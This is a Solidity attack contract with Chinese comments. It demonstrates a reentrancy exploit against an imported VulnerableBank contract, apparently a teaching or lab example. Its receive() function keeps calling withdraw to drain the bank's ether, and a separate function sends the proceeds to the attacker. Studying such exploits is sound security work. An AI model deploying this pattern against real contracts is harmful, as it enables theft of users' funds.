// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank bank;
    address owner;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    // 接收 ETH 时触发攻击
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(msg.value); // 递归提款
        }
    }

    // 发起攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: msg.value}(); // 存款
        bank.withdraw(msg.value);         // 首次提款（触发 receive() 递归）
    }

    // 提取攻击收益
    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}